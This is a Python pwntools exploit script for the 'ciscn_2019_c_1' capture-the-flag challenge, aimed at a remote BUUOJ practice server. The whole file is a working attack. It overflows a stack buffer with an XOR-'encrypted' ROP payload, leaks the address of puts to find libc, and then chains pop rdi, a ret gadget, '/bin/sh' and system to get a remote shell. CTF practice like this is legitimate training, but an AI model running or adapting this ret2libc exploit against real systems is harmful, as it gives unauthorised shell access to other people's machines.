from pwn import *
from LibcSearcher import *
#c = process('./ciscn_2019_c_1')
c = remote('node3.buuoj.cn',25467)
elf = ELF('./ciscn_2019_c_1')

main_addr = 0x400B28
pop_rdi = 0x400C83

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i])^0xF)
        elif l[i].isupper():
            l[i] = chr(ord(l[i])^0xE)
        elif l[i].islower():
            l[i] = chr(ord(l[i])^0xD)
    return ''.join(l)

c.recv()
c.sendline('1')
c.recvuntil('encrypted\n')
payload = '1'*0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload = encrypt(payload)
c.sendline(payload)

c.recvuntil('Ciphertext\n')
c.recvuntil('\n')
puts_addr = u64(c.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase = ' + hex(libcbase))

c.recv()
c.sendline('1')
c.recvuntil('encrypted\n')
sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')


payload = '1'*0x58+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
ret = 0x4006b9
payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
c.sendline(payload_Ubuntu18)
c.interactive()
